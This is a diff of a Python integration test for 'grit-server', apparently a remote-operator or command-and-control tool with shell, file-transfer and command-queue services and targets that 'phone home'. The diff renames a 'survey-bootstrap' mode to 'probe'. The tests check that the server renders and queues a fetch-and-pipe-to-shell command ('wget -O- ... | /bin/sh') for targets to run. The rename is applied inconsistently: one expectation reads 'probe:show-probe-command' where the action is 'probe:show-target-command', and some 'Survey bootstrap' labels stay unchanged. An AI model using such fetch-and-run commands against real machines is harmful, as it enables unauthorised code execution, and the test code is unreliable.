@@ -203,8 +203,8 @@ def main():
     if "bridge" not in combined or "--bridge-dest-host" not in combined or "--bridge-dest-port" not in combined:
         print("grit-server help missing explicit bridge mode", file=sys.stderr)
         return 1
-    if "survey-bootstrap" not in combined or "--survey-bootstrap-port" not in combined:
-        print("grit-server help missing survey bootstrap mode", file=sys.stderr)
+    if "probe" not in combined or "--probe-port" not in combined:
+        print("grit-server help missing probe mode", file=sys.stderr)
         return 1
     for word in ("--tui", "--serve-file", "--serve-dir", "--stage-release-artifact", "--release-dir", "--run-release-artifact-workflow-action", "--list-staged", "--status", "--stop", "--stop-service", "--view-path", "--json-status", "--api-status", "--event-limit",
                  "--help-console",
@@ -213,7 +213,7 @@ def main():
                  "--run-service-workflow-action", "--service-workflow-dry-run", "--confirm-service-workflow-action",
                  "--run-operator-daemon-workflow-action", "--operator-daemon-workflow-dry-run", "--confirm-operator-daemon-workflow-action",
                  "--run-command-queue-workflow-action", "--command-queue-workflow-command", "--confirm-command-queue-workflow-action",
-                 "--run-survey-bootstrap-workflow-action", "--survey-bootstrap-workflow-dry-run", "--confirm-survey-bootstrap-workflow-action",
+                 "--run-probe-workflow-action", "--probe-workflow-dry-run", "--confirm-probe-workflow-action",
                  "--run-bridge-profile-workflow-action", "--bridge-profile-workflow-dry-run", "--confirm-bridge-profile-workflow-action",
                  "--run-file-service-workflow-action", "--file-service-workflow-local-file", "--file-service-workflow-target-path", "--confirm-file-service-workflow-action",
                  "--run-staged-file-workflow-action", "--confirm-staged-file-workflow-action",
@@ -273,9 +273,9 @@ def main():
                  "Operator daemon workflow action summary:", "operator_daemon_workflow_actions_by_workflow",
                  "operator_daemon_workflow_actions:",
                  "operator_daemon_workflow_action_selected", "operator_daemon_workflow_action_completed",
-                 "Survey bootstrap workflow action summary:", "survey_bootstrap_workflow_actions_by_route_kind",
-                 "survey_bootstrap_workflow_actions:",
-                 "survey_bootstrap_workflow_action_selected", "survey_bootstrap_workflow_action_completed",
+                 "Survey bootstrap workflow action summary:", "probe_workflow_actions_by_route_kind",
+                 "probe_workflow_actions:",
+                 "probe_workflow_action_selected", "probe_workflow_action_completed",
                  "Command queue workflow action summary:", "command_queue_workflow_actions_by_action_id",
                  "queue COMMAND  |  queue list",
                  "command_queue_workflow_action_selected", "command_queue_workflow_action_completed",
@@ -1023,24 +1023,24 @@ def main():
             return 1
 
         survey_port = free_port()
-        survey_cfg = Path(tmp) / "survey-bootstrap-config.json"
-        survey_state = Path(tmp) / "survey-bootstrap-state.json"
-        survey_operator_dir = Path(tmp) / "operator-session-survey-bootstrap"
+        survey_cfg = Path(tmp) / "probe-config.json"
+        survey_state = Path(tmp) / "probe-state.json"
+        survey_operator_dir = Path(tmp) / "operator-session-probe"
         survey_cfg.write_text(json.dumps({
-            "transport": "survey-bootstrap",
+            "transport": "probe",
             "listen_host": "127.0.0.1",
             "operator_server_host": "127.0.0.1",
-            "survey_bootstrap_port": survey_port,
-            "survey_bootstrap_name": "yourfile.sh",
+            "probe_port": survey_port,
+            "probe_name": "yourfile.sh",
             "operator_session_dir": str(survey_operator_dir),
             "server_state": str(survey_state),
-            "session_root": str(Path(tmp) / "survey-bootstrap-sessions"),
+            "session_root": str(Path(tmp) / "probe-sessions"),
         }), encoding="utf-8")
         survey_proc = subprocess.Popen(
             [
                 "scripts/grit-server",
                 "--config", str(survey_cfg),
-                "--transport", "survey-bootstrap",
+                "--transport", "probe",
                 "--timeout", "1",
             ],
             cwd=ROOT,
@@ -1056,13 +1056,13 @@ def main():
             b"X-Grit-Target-Label: Survey Target\r\n"
             b"Connection: close\r\n\r\n",
         )
-        if b"#!/bin/sh" not in survey_get or b"/survey-bootstrap/result" not in survey_get:
-            print("survey bootstrap script response missing shell script content", file=sys.stderr)
+        if b"#!/bin/sh" not in survey_get or b"/probe/result" not in survey_get:
+            print("probe script response missing shell script content", file=sys.stderr)
             return 1
         survey_body = b"schema=1&script=yourfile.sh&uname_s=Linux&uname_m=mipsel&uname_r=4.14&word_bits=32&endian=little"
         survey_post = connect_with_retry(
             survey_port,
-            b"POST /survey-bootstrap/result HTTP/1.1\r\n"
+            b"POST /probe/result HTTP/1.1\r\n"
             b"Host: 127.0.0.1\r\n"
             b"X-Grit-Target-Id: target-survey\r\n"
             b"X-Grit-Target-Label: Survey Target\r\n"
@@ -1072,18 +1072,18 @@ def main():
             + survey_body,
         )
         if b'"status": "received"' not in survey_post or b'"architecture": "mipsel"' not in survey_post:
-            print("survey bootstrap result response missing received metadata", file=sys.stderr)
+            print("probe result response missing received metadata", file=sys.stderr)
             print(survey_post.decode("utf-8", errors="replace"), file=sys.stderr)
             return 1
         out, err = survey_proc.communicate(timeout=5)
         if survey_proc.returncode != 0 or "Listening on http://127.0.0.1" not in out:
-            print("survey bootstrap listener did not exit cleanly", file=sys.stderr)
+            print("probe listener did not exit cleanly", file=sys.stderr)
             print(out, file=sys.stderr)
             print(err, file=sys.stderr)
             return 1
-        survey_results = json.loads((survey_operator_dir / "survey-bootstrap-results.json").read_text(encoding="utf-8"))
+        survey_results = json.loads((survey_operator_dir / "probe-results.json").read_text(encoding="utf-8"))
         if survey_results.get("results", [{}])[0].get("architecture") != "mipsel":
-            print("survey bootstrap result ledger missing target architecture", file=sys.stderr)
+            print("probe result ledger missing target architecture", file=sys.stderr)
             print(json.dumps(survey_results, indent=2, sort_keys=True), file=sys.stderr)
             return 1
         survey_status = json.loads(run(
@@ -1091,32 +1091,32 @@ def main():
             "--config", str(survey_cfg),
             "--json-status",
         ).stdout)
-        survey_service = (survey_status.get("services_by_name") or {}).get("survey-bootstrap") or {}
+        survey_service = (survey_status.get("services_by_name") or {}).get("probe") or {}
         survey_target = (survey_status.get("targets_by_id") or {}).get("target-survey") or {}
         if (survey_service.get("port") != survey_port or
                 survey_service.get("actual") != "stopped" or
-                not (survey_status.get("events_by_event") or {}).get("survey_bootstrap_result") or
+                not (survey_status.get("events_by_event") or {}).get("probe_result") or
                 survey_status.get("summary", {}).get("target_latest_survey_result_count") != 1 or
-                survey_status.get("summary", {}).get("target_latest_survey_result_kind_counts", {}).get("survey-bootstrap") != 1 or
+                survey_status.get("summary", {}).get("target_latest_survey_result_kind_counts", {}).get("probe") != 1 or
                 survey_status.get("summary", {}).get("target_latest_survey_result_route_kind_counts", {}).get("direct") != 1 or
-                survey_target.get("latest_survey_result_kind") != "survey-bootstrap" or
+                survey_target.get("latest_survey_result_kind") != "probe" or
                 survey_target.get("latest_survey_result_status") != "received" or
                 survey_target.get("latest_survey_result_route_kind") != "direct" or
-                survey_target.get("latest_survey_bootstrap_script_route_kind") != "direct" or
-                survey_target.get("latest_activity_service") != "survey-bootstrap" or
-                survey_target.get("latest_activity_operation") != "survey_bootstrap_result" or
-                ((survey_status.get("targets_by_latest_survey_result_kind") or {}).get("survey-bootstrap") or [{}])[0].get("target_id") != "target-survey" or
+                survey_target.get("latest_probe_script_route_kind") != "direct" or
+                survey_target.get("latest_activity_service") != "probe" or
+                survey_target.get("latest_activity_operation") != "probe_result" or
+                ((survey_status.get("targets_by_latest_survey_result_kind") or {}).get("probe") or [{}])[0].get("target_id") != "target-survey" or
                 ((survey_status.get("targets_by_latest_survey_result_route_kind") or {}).get("direct") or [{}])[0].get("target_id") != "target-survey" or
                 ((survey_status.get("targets_by_latest_survey_result_status") or {}).get("received") or [{}])[0].get("target_id") != "target-survey"):
-            print("json status missing survey bootstrap evidence", file=sys.stderr)
+            print("json status missing probe evidence", file=sys.stderr)
             print(json.dumps(survey_status, indent=2, sort_keys=True), file=sys.stderr)
             return 1
-        direct_survey_commands = (survey_status.get("target_commands_by_service") or {}).get("survey-bootstrap") or []
+        direct_survey_commands = (survey_status.get("target_commands_by_service") or {}).get("probe") or []
         if (not direct_survey_commands or
                 direct_survey_commands[0].get("route_kind") != "direct" or
                 "wget -O- " not in direct_survey_commands[0].get("command", "") or
                 "| /bin/sh" not in direct_survey_commands[0].get("command", "")):
-            print("json status missing direct survey bootstrap target command", file=sys.stderr)
+            print("json status missing direct probe target command", file=sys.stderr)
             print(json.dumps(survey_status, indent=2, sort_keys=True), file=sys.stderr)
             return 1
         survey_route_port = free_port()
@@ -1139,7 +1139,7 @@ def main():
             [
                 "scripts/grit-server",
                 "--config", str(survey_cfg),
-                "--transport", "survey-bootstrap",
+                "--transport", "probe",
                 "--bridge-profile", "survey-route",
                 "--timeout", "10",
                 "--one-shot",
@@ -1156,10 +1156,10 @@ def main():
         bridged_out, bridged_err = bridged_survey_proc.communicate(timeout=5)
         expected_survey_command = f"wget -O- http://127.0.0.1:{survey_route_port}/yourfile.sh | /bin/sh"
         if (bridged_survey_proc.returncode != 0 or
-                f"http://127.0.0.1:{survey_route_port}/survey-bootstrap/result".encode("utf-8") not in bridged_script or
+                f"http://127.0.0.1:{survey_route_port}/probe/result".encode("utf-8") not in bridged_script or
                 expected_survey_command not in bridged_out or
                 "bridge profile survey-route" not in bridged_out):
-            print("bridged survey bootstrap route did not render expected target command", file=sys.stderr)
+            print("bridged probe route did not render expected target command", file=sys.stderr)
             print(bridged_out, file=sys.stderr)
             print(bridged_err, file=sys.stderr)
             print(bridged_script.decode("utf-8", errors="replace"), file=sys.stderr)
@@ -1170,10 +1170,10 @@ def main():
             "--bridge-profile", "survey-route",
             "--json-status",
         ).stdout)
-        bridged_survey_command = ((bridged_survey_status.get("target_commands_by_service") or {}).get("survey-bootstrap") or [{}])[0]
-        bridged_service = (bridged_survey_status.get("services_by_name") or {}).get("survey-bootstrap") or {}
-        bridged_survey_actions = bridged_survey_status.get("survey_bootstrap_workflow_actions") or []
-        bridged_survey_actions_by_id = bridged_survey_status.get("survey_bootstrap_workflow_actions_by_id") or {}
+        bridged_survey_command = ((bridged_survey_status.get("target_commands_by_service") or {}).get("probe") or [{}])[0]
+        bridged_service = (bridged_survey_status.get("services_by_name") or {}).get("probe") or {}
+        bridged_survey_actions = bridged_survey_status.get("probe_workflow_actions") or []
+        bridged_survey_actions_by_id = bridged_survey_status.get("probe_workflow_actions_by_id") or {}
         if (bridged_service.get("port") != survey_port or
                 bridged_service.get("route_kind") != "bridge" or
                 bridged_service.get("route_port") != survey_route_port or
@@ -1182,19 +1182,19 @@ def main():
                 bridged_survey_command.get("route_port") != survey_route_port or
                 bridged_survey_command.get("command") != expected_survey_command or
                 len(bridged_survey_actions) != 4 or
-                bridged_survey_actions_by_id.get("survey-bootstrap:show-target-command", {}).get("target_command") != expected_survey_command or
-                bridged_survey_actions_by_id.get("survey-bootstrap:show-target-command", {}).get("route_kind") != "bridge" or
-                bridged_survey_actions_by_id.get("survey-bootstrap:show-target-command", {}).get("bridge_profile") != "survey-route" or
-                bridged_survey_actions_by_id.get("survey-bootstrap:show-target-command", {}).get("run_command", "").find("--run-survey-bootstrap-workflow-action") == -1 or
-                bridged_survey_actions_by_id.get("survey-bootstrap:show-target-command", {}).get("run_command", "").find("--bridge-profile survey-route") == -1 or
-                bridged_survey_actions_by_id.get("survey-bootstrap:stop-survey-bootstrap", {}).get("run_command", "").find("--confirm-survey-bootstrap-workflow-action") == -1 or
-                bridged_survey_actions_by_id.get("survey-bootstrap:start-survey-bootstrap", {}).get("headless_command", "").find("--bridge-profile survey-route") == -1 or
-                bridged_survey_status.get("summary", {}).get("survey_bootstrap_workflow_action_count") != 4 or
-                bridged_survey_status.get("summary", {}).get("survey_bootstrap_workflow_action_route_kind_counts", {}).get("bridge") != 4 or
-                bridged_survey_status.get("summary", {}).get("survey_bootstrap_workflow_action_bridge_profile_counts", {}).get("survey-route") != 4 or
-                "survey_bootstrap_workflow_actions_by_bridge_profile" not in ((bridged_survey_status.get("api_collections") or {}).get("survey_bootstrap_workflow_actions") or {}).get("indexes", []) or
+                bridged_survey_actions_by_id.get("probe:show-target-command", {}).get("target_command") != expected_survey_command or
+                bridged_survey_actions_by_id.get("probe:show-target-command", {}).get("route_kind") != "bridge" or
+                bridged_survey_actions_by_id.get("probe:show-target-command", {}).get("bridge_profile") != "survey-route" or
+                bridged_survey_actions_by_id.get("probe:show-target-command", {}).get("run_command", "").find("--run-probe-workflow-action") == -1 or
+                bridged_survey_actions_by_id.get("probe:show-target-command", {}).get("run_command", "").find("--bridge-profile survey-route") == -1 or
+                bridged_survey_actions_by_id.get("probe:stop-probe", {}).get("run_command", "").find("--confirm-probe-workflow-action") == -1 or
+                bridged_survey_actions_by_id.get("probe:start-probe", {}).get("headless_command", "").find("--bridge-profile survey-route") == -1 or
+                bridged_survey_status.get("summary", {}).get("probe_workflow_action_count") != 4 or
+                bridged_survey_status.get("summary", {}).get("probe_workflow_action_route_kind_counts", {}).get("bridge") != 4 or
+                bridged_survey_status.get("summary", {}).get("probe_workflow_action_bridge_profile_counts", {}).get("survey-route") != 4 or
+                "probe_workflow_actions_by_bridge_profile" not in ((bridged_survey_status.get("api_collections") or {}).get("probe_workflow_actions") or {}).get("indexes", []) or
                 "target_commands_by_route_kind" not in ((bridged_survey_status.get("api_collections") or {}).get("target_command_records") or {}).get("indexes", [])):
-            print("json status missing bridged survey bootstrap route metadata", file=sys.stderr)
+            print("json status missing bridged probe route metadata", file=sys.stderr)
             print(json.dumps(bridged_survey_status, indent=2, sort_keys=True), file=sys.stderr)
             return 1
         bridged_survey_text_status = run(
@@ -1268,11 +1268,11 @@ def main():
                 "Traceback" in (survey_line_stderr or "") or
                 "Survey bootstrap:" not in survey_line_text or
                 f"target_command: {expected_survey_command}" not in survey_line_text or
-                "survey_bootstrap_workflow_actions: 4" not in survey_line_text or
+                "probe_workflow_actions: 4" not in survey_line_text or
                 "show_action_state=ready reason=show-command" not in survey_line_text or
-                "--transport survey-bootstrap" not in survey_line_text or
+                "--transport probe" not in survey_line_text or
                 "bridge_profile=survey-route" not in survey_line_text):
-            print("line TUI survey bootstrap action did not show bridged command", file=sys.stderr)
+            print("line TUI probe action did not show bridged command", file=sys.stderr)
             print(survey_line_text, file=sys.stderr)
             print(survey_line_stderr or "", file=sys.stderr)
             return 1
@@ -1280,13 +1280,13 @@ def main():
             "scripts/grit-server",
             "--config", str(survey_cfg),
             "--bridge-profile", "survey-route",
-            "--run-survey-bootstrap-workflow-action", "survey-bootstrap:show-target-command",
+            "--run-probe-workflow-action", "probe:show-target-command",
         )
         if (survey_action_show.returncode != 0 or
-                "survey bootstrap workflow action: survey-bootstrap:show-target-command" not in survey_action_show.stdout or
+                "probe workflow action: probe:show-probe-command" not in survey_action_show.stdout or
                 f"target_command={expected_survey_command}" not in survey_action_show.stdout or
-                "--run-survey-bootstrap-workflow-action survey-bootstrap:show-target-command" not in survey_action_show.stdout):
-            print("headless survey bootstrap workflow show action failed", file=sys.stderr)
+                "--run-probe-workflow-action probe:show-target-command" not in survey_action_show.stdout):
+            print("headless probe workflow show action failed", file=sys.stderr)
             print(survey_action_show.stdout, file=sys.stderr)
             print(survey_action_show.stderr, file=sys.stderr)
             return 1
@@ -1297,23 +1297,23 @@ def main():
             "--event-limit", "32",
             "--json-status",
         ).stdout)
-        survey_tui_service = (survey_tui_status.get("services_by_name") or {}).get("survey-bootstrap") or {}
+        survey_tui_service = (survey_tui_status.get("services_by_name") or {}).get("probe") or {}
         if (survey_tui_service.get("actual") == "listening" or
-                not (survey_tui_status.get("events_by_event") or {}).get("workbench_survey_bootstrap_started") or
-                not (survey_tui_status.get("events_by_event") or {}).get("survey_bootstrap_workflow_action_selected") or
-                not (survey_tui_status.get("events_by_event") or {}).get("survey_bootstrap_workflow_action_completed") or
+                not (survey_tui_status.get("events_by_event") or {}).get("workbench_probe_started") or
+                not (survey_tui_status.get("events_by_event") or {}).get("probe_workflow_action_selected") or
+                not (survey_tui_status.get("events_by_event") or {}).get("probe_workflow_action_completed") or
                 not any(
-                    event.get("service") == "survey-bootstrap" and
-                    "--transport survey-bootstrap" in event.get("details", {}).get("headless_command", "") and
+                    event.get("service") == "probe" and
+                    "--transport probe" in event.get("details", {}).get("headless_command", "") and
                     "--bridge-profile survey-route" in event.get("details", {}).get("headless_command", "")
                     for event in (survey_tui_status.get("events_by_event") or {}).get("service_start_requested", [])
                 ) or
                 not any(
-                    event.get("details", {}).get("survey_bootstrap_workflow_action_count") == 4
-                    for event in (survey_tui_status.get("events_by_event") or {}).get("workbench_survey_bootstrap_started", [])
+                    event.get("details", {}).get("probe_workflow_action_count") == 4
+                    for event in (survey_tui_status.get("events_by_event") or {}).get("workbench_probe_started", [])
                 ) or
                 not (survey_tui_status.get("events_by_event") or {}).get("service_stop")):
-            print("line TUI survey bootstrap listener was not workbench-owned/stopped", file=sys.stderr)
+            print("line TUI probe listener was not workbench-owned/stopped", file=sys.stderr)
             print(json.dumps(survey_tui_status, indent=2, sort_keys=True), file=sys.stderr)
             return 1
 
@@ -4765,7 +4765,7 @@ def main():
         for collection_name, expected_count, expected_index in (
                 ("services", len(queue_status_json.get("services") or []), "services_by_has_error"),
                 ("service_workflow_actions", len(queue_status_json.get("service_workflow_actions") or []), "service_workflow_actions_by_service"),
-                ("survey_bootstrap_workflow_actions", len(queue_status_json.get("survey_bootstrap_workflow_actions") or []), "survey_bootstrap_workflow_actions_by_route_kind"),
+                ("probe_workflow_actions", len(queue_status_json.get("probe_workflow_actions") or []), "probe_workflow_actions_by_route_kind"),
                 ("service_manager_state_records", len(queue_status_json.get("service_manager_state_records") or []), "service_manager_state_records_by_shutdown_requested"),
                 ("ports", len(queue_status_json.get("ports") or []), "ports_by_number"),
                 ("path_status_records", len(path_status_records), "path_status_by_name"),
@@ -4882,9 +4882,9 @@ def main():
                 api_resources_by_name.get("service_workflow_actions", {}).get("records_key") != "service_workflow_actions" or
                 api_resources_by_summary_key.get("service_workflow_action_count", [{}])[0].get("name") != "service_workflow_actions" or
                 not any(rec.get("name") == "service_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
-                api_resources_by_name.get("survey_bootstrap_workflow_actions", {}).get("records_key") != "survey_bootstrap_workflow_actions" or
-                api_resources_by_summary_key.get("survey_bootstrap_workflow_action_count", [{}])[0].get("name") != "survey_bootstrap_workflow_actions" or
-                not any(rec.get("name") == "survey_bootstrap_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
+                api_resources_by_name.get("probe_workflow_actions", {}).get("records_key") != "probe_workflow_actions" or
+                api_resources_by_summary_key.get("probe_workflow_action_count", [{}])[0].get("name") != "probe_workflow_actions" or
+                not any(rec.get("name") == "probe_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
                 api_resources_by_name.get("bridge_profile_workflow_actions", {}).get("records_key") != "bridge_profile_workflow_actions" or
                 api_resources_by_summary_key.get("bridge_profile_workflow_action_count", [{}])[0].get("name") != "bridge_profile_workflow_actions" or
                 not any(rec.get("name") == "bridge_profile_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
@@ -5244,7 +5244,7 @@ def main():
             print(queue_status_doc.stdout, file=sys.stderr)
             return 1
         services_by_name = queue_status_json.get("services_by_name") or {}
-        if set(services_by_name) != {"ssh", "tls-shell", "plain-shell", "file-service", "command-queue", "bridge", "survey-bootstrap"}:
+        if set(services_by_name) != {"ssh", "tls-shell", "plain-shell", "file-service", "command-queue", "bridge", "probe"}:
             print("server json status missing stable services_by_name map", file=sys.stderr)
             print(queue_status_doc.stdout, file=sys.stderr)
             return 1
@@ -7682,7 +7682,7 @@ def main():
                 upload_summary.get("target_workflow_action_target_counts", {}).get("target-alpha") != 9 or
                 upload_summary.get("target_workflow_action_workflow_counts", {}).get("command-queue") != 1 or
                 upload_summary.get("target_workflow_action_workflow_counts", {}).get("file-service") != 4 or
-                upload_summary.get("target_workflow_action_workflow_counts", {}).get("survey-bootstrap") != 2 or
+                upload_summary.get("target_workflow_action_workflow_counts", {}).get("probe") != 2 or
                 upload_summary.get("target_workflow_action_requires_input_count") != 4 or
                 upload_summary.get("target_workflow_action_offline_supported_count") != 9 or
                 upload_summary.get("target_workflow_action_requires_target_online_count") != 0 or
@@ -7712,12 +7712,12 @@ def main():
                 alpha_actions_by_action.get("queue-command", {}).get("can_run_from_curses_enter") is not False or
                 alpha_actions_by_action.get("queue-command", {}).get("queues_offline_work") is not True or
                 alpha_actions_by_action.get("queue-command", {}).get("target_phone_home_required") is not True or
-                alpha_actions_by_action.get("queue-survey-bootstrap", {}).get("queues_offline_work") is not True or
-                alpha_actions_by_action.get("queue-survey-bootstrap", {}).get("operator_action_state") != "queueable-offline" or
-                alpha_actions_by_action.get("queue-survey-bootstrap", {}).get("operator_action_reason") != "queues-until-phone-home" or
-                alpha_actions_by_action.get("queue-survey-bootstrap", {}).get("can_run_from_curses_enter") is not True or
-                alpha_actions_by_action.get("queue-survey-bootstrap", {}).get("target_phone_home_required") is not True or
-                alpha_actions_by_action.get("queue-survey-bootstrap", {}).get("headless_command") != f"scripts/grit-server --config {str(upload_cfg)} --run-target-workflow-action target-alpha:queue-survey-bootstrap" or
+                alpha_actions_by_action.get("queue-probe", {}).get("queues_offline_work") is not True or
+                alpha_actions_by_action.get("queue-probe", {}).get("operator_action_state") != "queueable-offline" or
+                alpha_actions_by_action.get("queue-probe", {}).get("operator_action_reason") != "queues-until-phone-home" or
+                alpha_actions_by_action.get("queue-probe", {}).get("can_run_from_curses_enter") is not True or
+                alpha_actions_by_action.get("queue-probe", {}).get("target_phone_home_required") is not True or
+                alpha_actions_by_action.get("queue-probe", {}).get("headless_command") != f"scripts/grit-server --config {str(upload_cfg)} --run-target-workflow-action target-alpha:queue-probe" or
                 alpha_actions_by_action.get("stage-file-fetch", {}).get("requires_input") is not True or
                 alpha_actions_by_action.get("stage-file-fetch", {}).get("queues_offline_work") is not True or
                 alpha_actions_by_action.get("stage-file-fetch", {}).get("offline_supported") is not True or
@@ -7734,7 +7734,7 @@ def main():
                 ((upload_doc.get("target_workflow_actions_by_workflow") or {}).get("command-queue") or [{}])[0].get("target_id") != "target-alpha" or
                 ((upload_doc.get("target_workflow_actions_by_requires_input") or {}).get("True") or [{}])[0].get("target_id") != "target-alpha" or
                 ((upload_doc.get("target_workflow_actions_by_queues_offline_work") or {}).get("True") or [{}])[0].get("target_id") != "target-alpha" or
-                ((upload_doc.get("target_workflow_actions_by_operator_action_state") or {}).get("queueable-offline") or [{}])[0].get("action_id") != "queue-survey-bootstrap" or
+                ((upload_doc.get("target_workflow_actions_by_operator_action_state") or {}).get("queueable-offline") or [{}])[0].get("action_id") != "queue-probe" or
                 ((upload_doc.get("target_workflow_actions_by_operator_action_reason") or {}).get("input-required") or [{}])[0].get("target_id") != "target-alpha" or
                 "file-service" not in (target_alpha.get("services_seen") or []) or
                 "http-header" not in (target_alpha.get("identity_sources") or [])):
@@ -7999,10 +7999,10 @@ def main():
         action_survey = run(
             "scripts/grit-server",
             "--config", str(action_cfg),
-            "--run-target-workflow-action", "target-action:queue-survey-bootstrap",
+            "--run-target-workflow-action", "target-action:queue-probe",
         )
         if (action_survey.returncode != 0 or
-                "target workflow action: target-action:queue-survey-bootstrap" not in action_survey.stdout or
+                "target workflow action: target-action:queue-probe" not in action_survey.stdout or
                 "queued " not in action_survey.stdout or
                 "wget -O- " not in action_survey.stdout or
                 "| /bin/sh" not in action_survey.stdout or
@@ -8053,7 +8053,7 @@ def main():
         action_staged_file_actions = (action_doc.get("staged_file_workflow_actions_by_request_name") or {}).get("action-staged.txt") or []
         action_staged_file_action_by_id = action_doc.get("staged_file_workflow_actions_by_id") or {}
         action_file_service_actions_by_id = action_doc.get("file_service_workflow_actions_by_id") or {}
-        action_survey_actions_by_id = action_doc.get("survey_bootstrap_workflow_actions_by_id") or {}
+        action_survey_actions_by_id = action_doc.get("probe_workflow_actions_by_id") or {}
         action_events = action_doc.get("events_by_event") or {}
         activity_inspected_events = action_events.get("workbench_target_activity_inspected") or []
         selected_events = action_events.get("workbench_target_selected") or []
@@ -8110,12 +8110,12 @@ def main():
                 completed_by_action.get("queue-command", {}).get("target_id") != "target-action" or
                 completed_by_action.get("queue-command", {}).get("queues_offline_work") is not True or
                 completed_by_action.get("queue-command", {}).get("target_phone_home_required") is not True or
-                completed_by_action.get("queue-survey-bootstrap", {}).get("command_id") != queued_survey[0].get("id") or
-                completed_by_action.get("queue-survey-bootstrap", {}).get("target_id") != "target-action" or
-                completed_by_action.get("queue-survey-bootstrap", {}).get("result") != "queued-survey-bootstrap" or
-                completed_by_action.get("queue-survey-bootstrap", {}).get("queues_offline_work") is not True or
-                completed_by_action.get("queue-survey-bootstrap", {}).get("target_phone_home_required") is not True or
-                "wget -O- " not in completed_by_action.get("queue-survey-bootstrap", {}).get("queued_command", "") or
+                completed_by_action.get("queue-probe", {}).get("command_id") != queued_survey[0].get("id") or
+                completed_by_action.get("queue-probe", {}).get("target_id") != "target-action" or
+                completed_by_action.get("queue-probe", {}).get("result") != "queued-probe" or
+                completed_by_action.get("queue-probe", {}).get("queues_offline_work") is not True or
+                completed_by_action.get("queue-probe", {}).get("target_phone_home_required") is not True or
+                "wget -O- " not in completed_by_action.get("queue-probe", {}).get("queued_command", "") or
                 completed_by_action.get("queue-staged-fetch", {}).get("command_id") != queued_fetch[0].get("id") or
                 completed_by_action.get("queue-staged-fetch", {}).get("target_id") != "target-action" or
                 completed_by_action.get("queue-staged-fetch", {}).get("result") != "queued-staged-fetch" or
@@ -8174,17 +8174,17 @@ def main():
                 action_doc.get("summary", {}).get("file_service_workflow_action_fleet_target_count_counts", {}).get("1") != 6 or
                 action_doc.get("summary", {}).get("file_service_workflow_action_fleet_mailbox_pending_work_count_counts", {}).get("3") != 6 or
                 action_doc.get("summary", {}).get("file_service_workflow_action_fleet_has_mailbox_pending_work_counts", {}).get("True") != 6 or
-                action_doc.get("summary", {}).get("survey_bootstrap_workflow_action_fleet_target_count_counts", {}).get("1") != 4 or
-                action_doc.get("summary", {}).get("survey_bootstrap_workflow_action_fleet_mailbox_pending_work_count_counts", {}).get("3") != 4 or
-                action_doc.get("summary", {}).get("survey_bootstrap_workflow_action_fleet_has_mailbox_pending_work_counts", {}).get("True") != 4 or
+                action_doc.get("summary", {}).get("probe_workflow_action_fleet_target_count_counts", {}).get("1") != 4 or
+                action_doc.get("summary", {}).get("probe_workflow_action_fleet_mailbox_pending_work_count_counts", {}).get("3") != 4 or
+                action_doc.get("summary", {}).get("probe_workflow_action_fleet_has_mailbox_pending_work_counts", {}).get("True") != 4 or
                 action_file_service_actions_by_id.get("file-service:list-staged-files", {}).get("can_run_from_curses_enter") is not True or
                 action_file_service_actions_by_id.get("file-service:show-upload-command", {}).get("requires_input") is not True or
                 action_file_service_actions_by_id.get("file-service:show-upload-command", {}).get("fleet_target_count") != 1 or
                 action_file_service_actions_by_id.get("file-service:show-upload-command", {}).get("fleet_mailbox_pending_work_count") != 3 or
                 action_file_service_actions_by_id.get("file-service:show-upload-command", {}).get("fleet_has_mailbox_pending_work") is not True or
-                action_survey_actions_by_id.get("survey-bootstrap:show-target-command", {}).get("fleet_target_count") != 1 or
-                action_survey_actions_by_id.get("survey-bootstrap:show-target-command", {}).get("fleet_mailbox_pending_work_count") != 3 or
-                action_survey_actions_by_id.get("survey-bootstrap:show-target-command", {}).get("fleet_has_mailbox_pending_work") is not True or
+                action_survey_actions_by_id.get("probe:show-target-command", {}).get("fleet_target_count") != 1 or
+                action_survey_actions_by_id.get("probe:show-target-command", {}).get("fleet_mailbox_pending_work_count") != 3 or
+                action_survey_actions_by_id.get("probe:show-target-command", {}).get("fleet_has_mailbox_pending_work") is not True or
                 "put TARGET_PATH" not in action_file_service_actions_by_id.get("file-service:show-upload-command", {}).get("target_command_template", "") or
                 action_doc.get("summary", {}).get("target_file_transfer_record_count") != 1 or
                 action_doc.get("summary", {}).get("target_file_transfer_operation_counts", {}).get("staged-fetch") != 1 or
@@ -8207,8 +8207,8 @@ def main():
                 "file_service_workflow_actions_by_route_kind" not in ((action_doc.get("api_collections") or {}).get("file_service_workflow_actions") or {}).get("indexes", []) or
                 "file_service_workflow_actions_by_fleet_mailbox_pending_work_count" not in ((action_doc.get("api_collections") or {}).get("file_service_workflow_actions") or {}).get("indexes", []) or
                 "file_service_workflow_actions_by_fleet_has_mailbox_pending_work" not in ((action_doc.get("api_collections") or {}).get("file_service_workflow_actions") or {}).get("indexes", []) or
-                "survey_bootstrap_workflow_actions_by_fleet_mailbox_pending_work_count" not in ((action_doc.get("api_collections") or {}).get("survey_bootstrap_workflow_actions") or {}).get("indexes", []) or
-                "survey_bootstrap_workflow_actions_by_fleet_has_mailbox_pending_work" not in ((action_doc.get("api_collections") or {}).get("survey_bootstrap_workflow_actions") or {}).get("indexes", []) or
+                "probe_workflow_actions_by_fleet_mailbox_pending_work_count" not in ((action_doc.get("api_collections") or {}).get("probe_workflow_actions") or {}).get("indexes", []) or
+                "probe_workflow_actions_by_fleet_has_mailbox_pending_work" not in ((action_doc.get("api_collections") or {}).get("probe_workflow_actions") or {}).get("indexes", []) or
                 "target_file_transfer_records_by_request_name" not in ((action_doc.get("api_collections") or {}).get("target_file_transfer_records") or {}).get("indexes", [])):
             print("target workflow actions did not mutate target-scoped queue/staged state", file=sys.stderr)
             print(json.dumps(action_doc, indent=2, sort_keys=True), file=sys.stderr)
@@ -10490,9 +10490,9 @@ def main():
                 "download [--queue] TARGET_PATH  show or queue target-to-operator upload" not in line_console_stdout or
                 "download [--queue] [--start] TARGET_PATH" not in line_console_stdout or
                 "Shows the target-side command to upload TARGET_PATH back to the operator file service." not in line_console_stdout or
-                "survey [--start|--queue]        show, serve, or queue survey bootstrap" not in line_console_stdout or
+                "survey [--start|--queue]        show, serve, or queue probe" not in line_console_stdout or
                 "survey [--start] [--queue]" not in line_console_stdout or
-                "Shows the target-side command for the architecture-agnostic survey bootstrap script." not in line_console_stdout or
+                "Shows the target-side command for the architecture-agnostic probe script." not in line_console_stdout or
